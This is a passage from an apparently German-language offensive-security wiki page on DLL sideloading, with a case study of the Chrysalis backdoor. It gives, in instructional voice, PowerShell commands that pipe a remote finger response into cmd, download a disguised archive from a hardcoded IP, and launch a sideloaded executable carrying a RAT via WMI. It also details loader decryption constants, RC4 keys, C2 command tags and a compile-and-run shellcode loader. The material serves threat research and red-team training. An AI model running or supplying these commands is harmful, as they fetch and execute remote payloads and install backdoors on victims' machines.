powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` zieht TCP/79-Text; `| cmd` führt die Server-Antwort aus, sodass Operatoren den Second-Stage-Server serverseitig rotieren lassen können.

- **Built-in download/extract:** Laden Sie ein Archiv mit einer harmlosen Erweiterung herunter, entpacken Sie es und legen Sie das Sideload-Ziel plus DLL unter einem zufälligen `%LocalAppData%`-Ordner ab:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` unterdrückt die Fortschrittsanzeige und folgt Redirects; `tar -xf` verwendet das in Windows eingebaute tar.

- **WMI/CIM-Start:** Starten Sie die EXE via WMI, damit die Telemetrie einen CIM-erstellten Prozess anzeigt, während sie die colocated DLL lädt:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); der Payload (z. B. Remcos) läuft unter dem vertrauten Namen.

- **Hunting:** Alarmieren Sie bei `forfiles`, wenn `/p`, `/m` und `/c` zusammen auftreten; das ist außerhalb von Admin-Skripten unüblich.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Bei einer jüngsten Lotus Blossom-Intrusion wurde eine vertrauenswürdige Update-Kette missbraucht, um einen mit NSIS verpackten Dropper zu liefern, der einen DLL-Sideload und vollständig im Speicher ablaufende Payloads bereitstellte.

Tradecraft-Ablauf
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine bösartige `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet dann die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` mappt den Blob per mmap in den Speicher; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Key-Material abgeleitet aus einem vorherigen Hash), überschreibt den Buffer mit Klartext-Shellcode, gibt temporäre Ressourcen frei und springt dann zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Export-Namen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193** hasht, dann eine Murmur-ähnliche Avalanche (**0x85EBCA6B**) anwendet und gegen gesalzene Ziel-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem add/XOR/sub mit dem Schlüssel `gQ2JR&9;` über fünf Durchläufe wiederholt werden, lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Import-Auflösung abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit mittels pro-Zeichen Bit-Rotate/XOR-Transformationen und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Export-Tabelle in 4-Byte-Blöcken mit Murmur-ähnlicher Mischung parst und nur auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Konfiguration liegt in der abgelegten Datei `BluetoothService` bei **offset 0x30808** (Größe **0x980**) und wird mit RC4 und dem Schlüssel `qwhvb^435h&*7` entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
- Beacons bauen ein punkte-getrenntes Host-Profil, hängen das Tag `4Q` davor und verschlüsseln es dann mit RC4 mit dem Schlüssel `vAuig34%^325hGV`, bevor `HttpSendRequestA` über HTTPS aufgerufen wird. Antworten werden mit RC4 entschlüsselt und per Tag-Switch verteilt (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Installation von Persistence (Service/Run-Key) pointing to `-i`; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt den Payload aus.

Beobachteter alternativer Loader
- Dieselbe Intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Quellcode bettete Shellcode ein, wurde kompiliert und im Speicher ausgeführt, ohne die Festplatte mit einem PE zu berühren. Replizieren mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud einen second-stage shellcode von einer fest kodierten URL herunter, wodurch ein flexibler Loader entstand, der sich als Compilerlauf tarnt.

## Referenzen

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
